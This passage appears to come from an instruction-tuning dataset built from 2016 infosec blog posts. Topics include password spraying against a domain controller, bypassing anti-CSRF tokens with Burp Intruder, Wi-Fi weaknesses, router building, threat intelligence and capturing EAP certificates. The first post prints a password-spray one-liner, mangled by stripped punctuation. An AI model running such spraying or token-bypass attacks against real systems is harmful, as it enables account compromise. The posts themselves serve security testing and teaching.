        "output": "Brian King There's a one-liner password spray script that a lot of folks use to see if anyone on a domain is using a bad password like LetMeIn or Winter2015 It reads a list of users from a file a list of passwords or just one password if you've got a healthy streak of paranoia about account lockouts from another and uses them to try to connect to the IPC share on a domain controller Like most one-liners it's easy to ruin the whole thing while substituting in the customer-specific parts So it's good to test it on your own user account before you run it against the whole domain If it finds your password which you've given it then you've got the syntax right and it'll find the others too On a recent engagement it didn't work out that way The sanity check failed to find the test account's password even though it was in the file to try What followed was a lesson in paying attention figuring out why things worked the way they did and some manual reading The first steps in troubleshooting are to describe the problem clearly then narrow a test case down to the smallest number of variables Problem Test Fails with Valid Credentials The whole command looks like this FOR F p in password.txt DO FOR F n in users.txt DO net use dc1 IPC p user CORP n 1 NUL 2 1 echo n p net use delete dc1 IPC NUL There's a lot going on there and like most one-liners it's not obvious where a failure might happen To make that a bit more readable FOR F p in password.txt DO FOR F n in users.txt DO net use dc1 IPC p user CORP n 1 NUL 2 1 echo n p net use delete dc1 IPC NUL That is For each line in the file password.txt set the p variable For each p variable set the n variable from the next line in the users.txt file Try to connect to the IPC share on a domain controller and ignore the output If the connection succeeded write a string to stdout with the username and password that worked And then if that worked disconnect Now that the whole thing is clear it's time to narrow things down Start at the beginning try reading one line from a test file and writing it to stdout This will make sure we're reading the files correctly Maybe it's a problem with line ending sequences or character encoding or maybe I'm not remembering how to pass a filename on the command line Could be anything Um OK That was quick The problem is that I'm only getting the first word on the line not the whole line I thought when you gave it a file it would read it line by line Time to Read The Fine Manual Wait what breaking it up into individual lines of text and then parsing each line into zero or more tokens That was unexpected Tab and space are the default delimiters but I can specify something else so I need something that's not in my password This'll work Yes that works But can I be sure that I'll never want to try a password with a plus in it How about the null character Nope How about the null string Yay Now that I know it was spaces causing the problem I know what the next problem will be I have to quote anything with a space in it for use on the command line This is why lazy hackers like me still try to avoid spaces in filenames Saves all that tedious quoting So do I need to quote that p when it's used as output in the script Let's find out Quotes Please It worked when I quoted it and failed when I didn't So we'll be quoting from here on out So the new more resilient password spray one-liner now looks like this FOR F delims p in password.txt DO FOR F delims n in users.txt DO net use dc1 IPC p user CORP n 1 NUL 2 1 echo n p net use delete dc1 IPC NUL I should really keep that someplace where I can find it"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Using Recursive Grep to Test Per-Request CSRF-Token Protected Pages</title>\n<taxonomies>David Fletcher, Red Team, Web App, Cross-Site Request Forgery, CSRF, CSRF-Token, Recursive Grep, Testing Protected Pages, XSRF</taxonomies>\n<creation_date>Mon, 07 Mar 2016 22:24:33 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher Cross-Site Request Forgery CSRF or XSRF is an attack which is used to execute a transaction on behalf of a victim user against a vulnerable web application To be vulnerable to CSRF an attacker must be able to determine and submit all of the values necessary to execute the target transaction in advance If this is possible an attacker will use social engineering craft a malicious URL or post a malicious form on a third party site that will accept unfiltered HTML input When the targeted user executes the attacker's content the transaction is executed on the target web application As a defense against CSRF attacks web applications employ Anti-CSRF tokens in sensitive forms The token is a random value that is generated when the target form is loaded and verified when the form is submitted Since an attacker cannot know the value in advance and must have the value to successfully submit the form this technique when implemented properly will thwart CSRF attacks Some anti-CSRF implementations change the token value with each submission of the form A side-effect of this behavior is that automated testing becomes nearly impossible without taking the token value into consideration In this post I will demonstrate how Burp Intruder's Recursive Grep payload can be used to solve this problem Once the Recursive Grep payload is understood it can be used to solve nearly any dependency on a previous server response I recently encountered a WebSphere portal that exhibited the behavior described above When any form was submitted to the server multiple values would change in the ensuing response which prevented automated tools like Burp Repeater and Burp Intruder from working properly on the site The server would simply respond by reloading the blank form with newly updated token values To demonstrate this problem I have created a single ASP.NET web form with two fields For simplicity the current token value is displayed on the form If this form is submitted without the correct token value the string Invalid Token Value is displayed However when the correct token value is submitted the submitted values are reflected on the page along with an indication of success Basic Form with Token Value Displayed Token Validation Error Successful Form Submission If no compensation is made for the token value when Burp Intruder is run trying to tamper the form fields we see the following results This is because the token is changing with each request and being validated when the form is submitted Since the values don't match none of the requests is successful Unsuccessful Intruder Attack Due to Invalid Token Value To accommodate for the token value present in the response we can use the Burp Intruder Recursive Grep payload This payload will formulate and insert a parameter into your request based on the previous server response The derived parameter can originate from any arbitrary location in the response and you can include as many recursive grep payloads as you need While testing the WebSphere portal mentioned above there were three distinct values that changed with each response from the server In order to use the Recursive Grep payload we must make some adjustments to our standard Intruder Attack setup In the instance above I simply selected the txtFName parameter specified a sniper attack using the simple list payload and selected the default Burp username list Using Recursive Grep requires us to select either the Pitchfork or Cluster Bomb attack type Since we are tampering only one parameter the Pitchfork attack makes sense This attack will stop when the shortest list is exhausted With multiple significant parameters this attack treats the values in each list as a tuple In contrast the Cluster Bomb attack tests each of the possible permutations generated by each list Our setup can be seen below The target field txtFName and token checkToken are identified as payload positions and the Attack Type is Pitchfork Intruder Attack Setup with Parameter and Token Payload Positions Since the target field appears first in the request we select simple list as the payload type and specify the Burp username list as described earlier Simple List Payload Configuration The second field is our checkToken value In this case we desire a Recursive Grep payload but first we must set up the Grep location To do so we have to navigate to the options tab and scroll down to the Grep Extract location in the form Burp Intruder Grep Extract Once there click the add button to add an extract location On the ensuing form scroll down in the HTTP response body and highlight the CSRF token value This identifies the location in the previous response that Burp will use for the Burp Recursive Grep payload Grep Extract Location Selection One final adjustment on the Options tab is required to ensure that the recursive grep works properly Since there is a direct relationship between the previous response and the current request the number of threads must be set to 1 Burp Intruder Attack Request Engine Options With intercept enabled on the proxy submit the form to capture the current token value This is required to seed the Recursive Grep payload and will be used to begin the intruder attack Intercepted Post with Current Token Value Now return to the Burp Intruder attack and select the Payloads tab Select the appropriate payload index and select the Recursive Grep payload type You should see the Grep Extract entry that you created above Select this value and paste the current token value into the Initial payload for first request field Recursive Grep Payload Options With all of our options set we can finally execute our Intruder Attack Since the checkToken parameter was selected as a tampered value we can see the submitted value in our attack In addition because of the requirement for a Grep Extract to facilitate the attack we can see the value returned in the previous form submission Inspecting the output we can see that the response indicates success the word invalid no longer appears in the output and that the token values cascade from response to request as expected Successful Intruder Attack Results Hopefully this post will be valuable if you encounter behavior like this While the Recursive Grep payload is effective against some Anti-CSRF behavior it is not a one size fits all solution Within the same WebSphere portal that forced me to investigate the Recursive Grep payload there were multi-step form submissions that this feature just couldn't handle These forms involved multiple posts to the same location Each post generated new token values which had to be submitted in sequence One set of tokens would activate the form and the next would submit Without the first the page would simply reload without the active form I am currently investigating a solution to this problem and have started a Burp Extension to address it Look for this capability in a future post"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to create a SOHO router using Ubuntu Linux</title>\n<taxonomies>Author, How-To, Joff Thyer, soho router, ubuntu linux</taxonomies>\n<creation_date>Fri, 04 Mar 2016 15:42:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer This post is cross-posted from Packet Header on 3 1 16 __________ On Security Weekly Episode 452 I presented a technical segment on how to build your own small office home office wired router This blog post will list of the essential components and expand upon the technical segment Our goal is to build a multi-segment wired router that performs Network Address Translation NAT with IPv4 runs Internet Software Consortium ISC Bind9 for domain name service and ISC DHCP services to deliver IP addresses on the inside of your network NOTE Supporting configuration files associated with this blog post can be found at itbucket.org jsthyer soho_router From a hardware standpoint you can choose any dual NIC or higher computer that will support an Ubuntu 14.04.4 LTS server installation I would recommend a minimum of 1024MB 1GB of RAM and 16GB of hard disk space Some hardware that I have found useful includes the Soekris Net6501 oekris.com products net6501-1.html or the Netgate RCC-VE 2440 tore.netgate.com ADI RCC-VE-2440.aspx The starting point for building the router is to install Ubuntu-14.04.4 LTS server 64-bit and then install the following additional packages apt-get install bind9 apt-get install isc-dhcp-server apt-get install ntp The next and very important step is to ensure that IP forwarding is turned on in your kernel If you don't do this you don't route any packets and the game is over In order to enable IP forwarding please add the following lines to the bottom of the etc sysctl.conf file and reboot your system Note that while we at changing the system configuration we will disable IPv6 since you are probably not using it etc sysctl.conf The core of the configuration for a router is to make sure that your network interfaces are configured properly and that your IPTABLES configuration is set up to properly translate and forward traffic to the Internet Network Interface Configuration Starting with network interfaces we will assume that your public Internet address can either be static or obtained via DHCP We will assign the Linux network interface eth0 to be the Wide Area Network WAN connection to your Internet Service Provider Just for demonstration purposes we will assume a static Internet address of 255.1.1.2 and a network mask of 30 Your ISP's device will be assigned 255.1.1.1 Your public network subnet mask is calculated using the following math subnet mask 2 32 2 32-30 255.255.255.252 in dot quad notation We will also assume that you have a total of four network interfaces on your router device which will yield up to three internal network segments Listed below is the top section of what will be the etc network interfaces file This not only contains the eth0 definition but also contains some additional security features in the form of null routes for any RFC1918 network traffic that appears with a shorter prefix than the connected interfaces and also routes multicast 224.0.0.0 4 to the bit bucket If you need to use DHCP for your Internet public address you can un-comment the marked entries for the eth0 interface that starts with using dhcp and comment out the static address part One more aspect is that the iptables rules are expected to be listed in etc iptables.rules More about this later in the article etc network interfaces Now we need to establish what the internal inside interfaces of our network look like For simplicity we will use class C 24 networks and assign them the addresses 10.1.1.0 24 10.1.2.0 24 and 10.1.3.0 24 respectively This is how you configure the remainder of the etc network interfaces file to reflect this etc network interfaces IPTABLES Rules Configuration As listed in the network interfaces configuration file we are going to create the file etc iptables.rules and depend upon the networking code to load the configuration when the system boots We can also test our iptables configuration at any time using the iptables-restore command The IPTABLES configuration is broken into two sections these being the Network Address Translation and the Filtering section In short performing Network Address Translation with IPTABLES is a one-liner In this example we assume that the internal network is addressed in the 10.0.0.0 8 range and that the public Internet Protocol address WAN interface is configured on eth0 As a bonus and if you want to run the Squid web proxy there is a line to rewrite traffic on internal network segments destined to TCP port 80 to the standard Squid TCP port of 3128 NAT section of etc iptables.rules Having created the NAT section of the iptables ruleset you are still required to create the filtering rules to determine what is going to ingress and egress your actual gateway router system as well as determine what traffic will forward across your router I am going to break the filter section of the IPTABLES rules down into multiple different parts of this article these being Traffic being received by the router INPUT Traffic being sent by the router OUTPUT Traffic being forwarded across the router FORWARD Traffic being logged by the router LOG_DROPS We will start the filtering section of the IPTABLES configuration by adding a LOG_DROPS chain to the ruleset This will allow us to write logs on any traffic that is dropped After that we will implement some common sense network protections for the router itself which include dropping any traffic to eth0 that sources from 0.0.0.0 8 dropping any traffic to eth0 that sources from RFC1918 addresses dropping any traffic to eth0 that sources from a multicast address 224.0.0.0 4 dropping fragmented IP traffic dropping ingress packets that have an IP TTL less than 4 dropping any packets destined to TCP UDP port 0 dropping any packets with all or no TCP flags set Starting portion of filter section Common sense protections In the next part of the INPUT section we are defining the following rules for the router to receive traffic as follows Accept all traffic to the Loopback interface A lot of software will use Loopback for internal communications and it is better to not break things Accept traffic for the Domain Name Service DNS bind9 server on any interface This is needed because we are running bind9 on the router itself and we might likely decide to host some of our own DNS zones Accept specific traffic from our internal network This includes DNS DHCP server requests network time protocol and Squid traffic if you choose to run Squid Accept internet control message protocol ICMP Packet input ingress to router section of filter section In the OUTPUT section we need to the router to forward all traffic to the Loopback interface and then we need to define rules for the router itself to transmit to the internal network and the Internet as follows Transmit DNS traffic to any host on any network Allow the router to perform WHOIS queries on TCP port 43 and allow for Ubuntu software updates across HTTP HTTPS Allow the router to perform Network Time Protocol queries Allow the router to transmit DHCP INFORM packets on the internal network Allow the router to transmit ICMP packets on the internal network Packet output egress section from router of filter section Now we accept state-related packet flows and then drop and log anything else The FORWARD section of the IPTABLES rules determines exactly what traffic is able to flow be forwarded across your router It is important to not confuse this section with the INPUT OUTPUT portions of the rules The FORWARD section is where the magic happens to get packets from your internal network to the Internet In this example we have a fairly liberal policy which allows all IPv4 TCP UDP and ICMP traffic to the Internet and accepts any state-related traffic Packets that will be forwarded across the router interfaces As a final step in our configuration we log all dropped packets to the syslog LOCAL7 facility The idea being that we can configure rsyslog with a rule that matches this prefix and writes the logging data to a file Finally we log things by prefixing iptables to the syslog data flow For extra information here is the rsyslog configuration file I use to log the data etc rsyslog.d 30-iptables.conf DHCP and DNS Services Now we have covered the essential core components of forwarding packets we can talk about DHCP and DNS Starting with DHCP what we need to do is provide basic IP address service on our three internal network segments On each segment we will start with a lower address at x.x.x.50 so we can reserve a little static address space for other miscellaneous uses We will also set up lease times for 30 days 30 86400 seconds Addresses will be provided on all three internal network interfaces eth1 eth2 and eth3 This file is to be saved as etc dhcpd dhcp.conf etc dhcp dhcpd.conf With regard to bind9 DNS services the default Ubuntu installation will yield a caching name server which utilizes the Internet root caching servers and is sufficient for most purposes The extension some people may want to consider is to forward queries to a DNS filtering service such as OpenDNS and or run some specific filtering on your own In my case I leverage the dshield bad domain lists which as maintained by Johannes Ulrich of the SANS Institute An example of how to configure bind9 to forward all queries to an upstream DNS server is listed below The configuration screenshot below is a modification to the etc bind named.conf.options file to forward all queries to the upstream Google DNS server of 8.8.8.8 and to filter the networks able to perform recursive DNS queries Forwarding to an upstream server is completely optional and if you choose this a trusted DNS filtering service is advisable Filtering on what clients can make recursive queries should be considered as an essential part of the configuration etc bind named.conf.options As regards the dshield bad domains list I have created a shell script called get_malware_domains.sh whose job it is to fetch the URL sc.sans.edu feeds suspiciousdomains_Low.txt and then convert that list into bind9 configuration file format An example of the configuration file format is as follows named.conf.dshield file The concept is that any domain listed in this file will be resolved to the address 127.0.0.1 The db.blackhole file contents All of the above descriptive text will also be supported by a small tar file containing some of the key file contents described here Happy hunting"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>More on Threat Intelligence Feeds</title>\n<taxonomies>Author, Derek Banks, InfoSec 101, Purple Team, threat intelligence feeds</taxonomies>\n<creation_date>Wed, 02 Mar 2016 15:48:39 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Derek Banks John's hating on threat intelligence feeds post got me thinking As a former blue team member that is now solidly purple team I do not hate threat intelligence sorry John But I am not going to disagree with John's take and not just because he signs my paychecks because he's right Paying for a feed of blacklisted IP addresses and domain names and ingesting that firehose of data into a security device to detect or prevent it and slapping a threat intelligence label on it is not all that effective Purchasing the latest super-appliance that promises to stop all advanced attacks before the attacker even thinks about it while drinking his morning coffee is not going to actually going to stop a determined attacker If this is your organization's idea of what threat intelligence is and how to use it then you're doing it wrong What you are going to accomplish in that model is either sending out tons of meaningless alerts to information security staff with no context of why something may be bad or even worse blocking access to something for your users when somehow Google.com made it into the threat intelligence feed that you have no control over what goes in it of course that would never happen right So then who is threat intelligence good for For organizations that already have effective and tested controls in place for basic security issues such as patching and vulnerability management and are ready to start actively hunting for attackers in their network If your organization has effectively addressed the CIS Critical Controls then you may be tall enough for the threat intelligence ride So what exactly is threat intelligence Vendor XYZ told me that their super-appliance stops all advanced attacks thirty minutes before they even happen using threat intelligence As with many things in the computing world terms to describe technology end up becoming buzzwords used by vendors to sell more products this definitely seems to be the case with threat intelligence To me there are two categories The first is Atomic Indicators of Compromise IOCs These are things that cannot be broken down further into additional data such as IP addresses domain names and file hashes These are typically what you see in a threat intelligence feed Atomic indicators are then used to help describe the next category Tools Techniques and Procedures TTPs This describes the tools an attacker uses the techniques they employ with those tools and the procedures they follow to reach a specific goal This is generally not what you find in a threat intelligence feed For example When this attacker sent an email from the server at this IP address the malicious attachment with this file hash created a command and control channel to the server at this IP address Then the attacker downloaded and used this Remote Access Tool and moved laterally in the internal network over SMB and gathered this type of sensitive data from these systems and used this compression method to package up the data and exfiltrate it to this other IP address Wait this sounds difficult to figure out how can an appliance do that It is Very difficult An appliance or feed cannot do that kind of analysis people do that analysis Attackers can change atomic indicators relatively easily When they do the feed does not help detect that attacker any longer until an actual person somewhere does some analysis and adds new data back in Effective use of threat intelligence takes a dedicated team of security analysts that have as their only job to detect and respond to potential attackers in your network It cannot be done by purchasing an appliance or feed of indicators given to the one security guy who already is not paying attention to the 3 000-a-day alerts from the un-tuned IDS because he is trying to figure out why a patch broke 12 workstations in the HR department So now we have a team of people and want to get started with effectively using threat intelligence where do we begin To get started seek out and become involved with security analyst communities that analyze and share information specific to your industry These groups do exist and data that you get from the analysts that contribute to the intelligence will have more context than a feed from a vendor serving every industry Also generate your own threat intelligence When someone in the C-suite reports an email as suspicious and it turns out that the attachment is a weaponized document take the time to do some analysis and gain some indicators of your own Afterall the indicators from that one phishing attempt have a much better chance of being someone actually attacking your organization rather than any of the indicators in a feed from a vendor Now that you are getting some context to why a particular atomic indicator is bad for your organization what do you do with it I would suggest looking through your log files to see if any has ever been seen before in your network Next put into the appropriate detection device to let you know if you see it in the future but do so with the realization that the atomic indicator has a relatively short lifespan If it is data that you discovered from your own analysis contribute it back to the information sharing community that you are now a part of Provide the atomic indicators in as much detail as you can on the TTPs the attackers used Just one atomic indicator of recent and specific attacker activity could help prevent an incident but TTPs are harder for an attacker to change and will be valid longer than atomic indicators alone This kind of analysis feedback model with information sharing groups is a much more effective way of actually using threat intelligence to discover attackers in your network and to help others do the same"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Beware Public Wi-Fi Insecurity - Part 1: Reviewing the Neighborhood</title>\n<taxonomies>Author, General InfoSec Tips & Tricks, InfoSec 101, Jordan Drysdale, free wifi, the dangers of public wifi, wifi</taxonomies>\n<creation_date>Tue, 02 Feb 2016 16:55:08 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Our community's downtown district is approximately a five block by four block area There are art stores toy shops candy retailers restaurants bars and hotels Significant investment has been made in revitalizing and adding an area called Main Street Square Almost all of these businesses offer some form of public wireless network whether it is wide open or protected by some pre-shared key As a network contractor paid by many of these businesses to keep track of their networks over the last several years I have witnessed calamity and chaos come to life Walking through our city's center there were just short of 500 radios broadcasting some form of wireless signal About 200 SSIDs were wide open and another 40 or so were running WEP or WPA WPS is also way too common on the streets considering Reaver Bully and various other applications are designed to pull passwords from this protocol For those WPA2 networks the majority are broadcasting a name similar to CompanyName_Staff While every business in our downtown district is swiping credit cards and signing off their PCI SAQs gathering this amount of data clearly shows a lack of regard for even simple security In connecting to a few of these public Wi-Fi networks the problems with one deployment seem to span the entirety Client Isolation appears to the check box that every installer misses when deploying these networks If a client device is infected or malicious they have access to every other client attached to these public networks Another common flaw in design and failure in PCI compliance is to change the default credentials on the Wi-Fi device providing access Without knowledgeable technicians deploying these Wi-Fi devices guest users now have access to these internal business networks as if they were connected directly Business owner beware your guest wireless is probably a threat to your internal network A local ISP in our area asked our city council for the privilege of deploying what they believe to be City Wide Wi-Fi After tentative approval the ISP then offered our mutual client something like ...better bandwidth second internet line you will not have to worry about your guest Wi-Fi anymore and we spend lots of money sponsoring downtown stuff Our client went ahead and approved the installation against our recommendations Due to the nature of our relationship with this client we were given the privilege to investigate A quick device scan was run after connecting as a public Wi-Fi guest The other clients on the public Wi-Fi network were reachable meaning simply that guest isolation was not enabled and any miscreant or infected device could steal data We also determined the ISP's Wi-Fi device was using a DHCP lease from the internal network This internal DHCP address was used to NAT guest wireless users out to the internet over the internal business network Finding other internal devices was trivial at this point We were able to access a firewall login page and create a Remote Desktop session to their Exchange server The bottom line here is that this is not an acceptable solution for 21st century Wi-Fi deployments Public Wi-Fi insecurity represents another facet of the seemingly insurmountable deficit of basic IT security knowledge Business owners have zero idea whether or not the firms they hire to install new solutions understand access controls routing firewall zoning or any of the other fundamental requirements of deploying public Wi-Fi properly or even what firewall zone based access controls are So how do we as IT Professionals assist the general business community make better decisions regarding their wireless networks First Small Office Home Office SOHO products are generally not an acceptable solution for providing guest Wi-Fi If your vendor is installing something you can purchase at Best Buy you should express concern Second be very aware of guest access privileges If they have too much privilege you may be responsible for providing the medium wireless over which data theft occurs Lastly awareness matters If we as IT Pros can expand the understanding of basic security we can improve the results of Reviewing the Neighborhood"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Secure Your Home Network</title>\n<taxonomies>General InfoSec Tips & Tricks, InfoSec 101, home network, how to secure a network, securing a network</taxonomies>\n<creation_date>Fri, 18 Mar 2016 21:49:55 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Katherine MacMillan Something interesting happened last week A programmer by the name of Matthew Garrett gained access to the lighting and window controls to nearly every room of a hotel he was staying in You can read his post here jg59.dreamwidth.org 40505.html cmt1611577 This made me think about network connected devices and home network security I too have smart lights and call me paranoid but I don't want someone gaining access to my systems Apart from the annoyance of them being funny and changing my lights randomly it could give them insight to when I'm awake and when I'm home Granted if they sat in a car near my house and watched long enough they would get the same information but that's more work and probably not worth it Simply accessing a network and having that information that's a little easier Beyond just lights though many homes are increasingly gaining various wi-fi connected features and controls which could be potential vulnerabilities if the network were not properly secured There are devices that will control your lights your tv your music phone and more There are home security systems that will allow you to set up cameras that can be streamed to your phone All of this information all of these systems on your network means it's important to be secure but what does that even mean Back in the bad-old days when wi-fi was in its youth it was easy to login to your neighbors wifi maybe borrow his printer for a laugh I had friends who would drive around with a laptop looking for open networks to connect to Luckily times have changed and people have become a little more responsible with their home networks Most people go in and set up their network SSID and password protect it which is a first big step to keeping interlopers out But is this enough As I read about Matthew's somewhat misadventure I began to wonder how secure my simple password protected network is A smart man once said that security is an ongoing thing it's continual and we have to be vigilant That being said there are some simple and sometimes obvious things we can do to help make our home networks a little more unappealing to those who would try to gain access to them The Device Use a device that supports Wi-Fi Protected Access 2 WPA2 preferably with Advanced Encryption Standard AES This will encrypt communication between the router and device and is currently the most secure configuration for home networks Think about the placement of your router The device will emit signals which can extend beyond the home By optimizing the location of the antenna in the house you can minimize how much of that signal is exposed for outsiders to pick up on You can also fine tune the transmission levels and signal strength to this end It's also a good idea to update the router's firmware since updates often contain patches for previously discovered vulnerabilities The Settings Most routers have a web browser based interface which can be accessed by typing the router's IP address into the browser address bar From here you can improve your security by making some small changes to a few settings Routers come with some default settings which are publicly known so it's important to change these to something unique making it more difficult to gain access Give your network a name SSID and a passphrase I say phrase because something long is best A long phrase 16 characters or more is harder to crack than a short but complex phrase long and complex is even better It's not a bad idea to change your router's IP and interface login password the defaults are public knowledge and this will make it so that an attacker can't just plug in the defaults to gain access Make them work for it Turn off Wi-Fi Protected Setup WPS and the UPnP feature if you can This may sound counter intuitive but there are design flaws in WPS which allow attackers to brute-force an access code relatively quickly The UPnP feature allows compatible devices to change router settings without going through the router interface a very appealing prospect to network intruders However many gaming consoles utilize this so it might not be feasible to disable it You will also want to keep remote access turned off unless you need it Ensure that you logout of the router interface when you're finished It is also wise to pay attention to the devices on your network naming the various devices will help you recognize if there is an unfamiliar connection It's easy to point out how unlikely it is someone would spend time trying to get into your specific network but why take the risk when you can improve the security of your devices by changing some simple features Information Sources jg59.dreamwidth.org 40505.html cmt1611577 ww.cnet.com how-to home-networking-explained-part-6-keep-your-network-secure ww.us-cert.gov ncas tips ST15-002"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>TLS Certificates from EAP Network Traffic</title>\n<taxonomies>Author, Blue Team, Blue Team Tools, Joff Thyer, Red Team, Red Team Tools, EAP Network, TSL Certificates</taxonomies>\n<creation_date>Wed, 09 Mar 2016 22:44:40 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer A network can authenticate a client workstation using the 802.1X and Extensible Authentication Protocol EAP using multiple different methods EAP is used both in a wired network context as well as a wireless network context It is fairly common for EAP-PEAP to be used for most authentication in enterprise networks although EAP-TLS can be used also EAP-PEAP EAP-PEAPv0 is the most common form of EAP in use whereby MSCHAPv2 encoded credentials are protected inside of a TLS tunnel The TLS tunnel is established using a server presented certificate delivered using RADIUS protocol to the authenticator switch or wireless controller and then delivered using EAP to the 802.1x client supplicant The client supplicant must then validate the certificate chain of trust before establishing the TLS tunnel Once the tunnel is established MSCHAPv2 is used to send username and password credentials to the RADIUS server EAP-TLS is very similar to EAP-PEAP only that mutual TLS certificate authentication is performed The client supplicant presents a client certificate which is validated by the server and then the RADIUS server presents a server certificate which is validated by the client After the certificate exchange process completes with an appropriate chain of trust validation authentication credentials may be presented across the TLS tunnel In some organizations credentials are not even validated and the mere exchange of mutually signed certificates is sometimes considered sufficient In the Wireless network context using WPA2-Enterprise mode all of the EAP transactions occur in cleartext as the pairwise master key calculation for AES based encryption cannot be completed before authentication credentials are exchanged This means that when using a sniffer on a wired port or in the wireless airspace the certificates that are exchanged can be captured This might be useful information if as some organizations implement mutual certificate exchange is deemed sufficient for machine-based authentication Note In the world of 802.1x and Microsoft Windows the 802.1x supplicant is implemented with a dual-level authentication A machine credential can be presented upon machine boot and a user credential presented when the user logs into the machine after the boot phase In order to capture the bytes of X.509 certificates during an EAP-TLS exchange either configure wireshark to monitor a wired interface that represents a passive network tap between a client workstation and network switch or configure a monitor mode wireless network interface A wireless command-line example is iw dev wlan0 interface add wlan0mon type monitor In order to capture EAP traffic in Wireshark it is simplest to enable a display filter by using the keyword of eap After enabling the display filter perform the login sequence on the client workstation in question by rebooting the machine and re-authenticating or even by simply disconnecting and reconnecting the wired network interface Assuming a full authentication sequence is successful you should see a packet capture similar to the diagram below The authenticator Wireless AP or network switch sends an EAP Request Identity message and assuming the client workstation is configured correctly it will respond with a Response Identity message Assuming things are configured correctly the authenticator will then request EAP-TLS protocol as seen in packet 188 listed above What is of interest to us starts at packet 192 whereby the actual certificates are exchanged In this exchange we should be able to export the certificate both presented by the client as well as the certificate presented by the server In addition RADIUS servers will often send the Certifying Authority CA certificate along with the RADIUS server certificate itself Altogether we may extract three total certificates Note that EAP packets are OSI layer 2 and thus limited to the MTU of the transmission medium which will most often be 1500 bytes or less Thus the EAP protocol will fragment the certificate data over multiple frames Having said that Wireshark is kind enough to reassemble these fragments Looking at frame 192 in the wireshark capture we can see that the protocol dissector shows us two different certificates in the SERVER HELLO packet one of which has the common name of living.thyer.org the RADIUS server and the other has the common name of ROOT-CA the certifying authority To save the certificate a simple byte export is required by highlighting the Certificate field in the protocol dissector window right-clicking and selecting Export Selected Packet Bytes This can be repeated for ALL certificates in the EAP packet exchange After this has been completed you should successfully have a binary certificate DER representation of either two or three certificates contained within the EAP traffic The diagram below shows the client-side certificate starting in packet number 207 In order to validate the certificate format and information you can use OpenSSL on the command line to read the certificate openssl x509 -inform DER -in cert.der -text To convert back to PEM base64 format you can specify the OpenSSL -out flag with a new filename openssl x509 -inform DER -in cert.der -out cert.pem"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>That One Time My Parents Were Hacked</title>\n<taxonomies>General InfoSec Tips & Tricks, InfoSec 101, bad tech support, canon, family, mistakes, ransomeware, Spyware, tech support</taxonomies>\n<creation_date>Fri, 11 Mar 2016 22:52:02 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
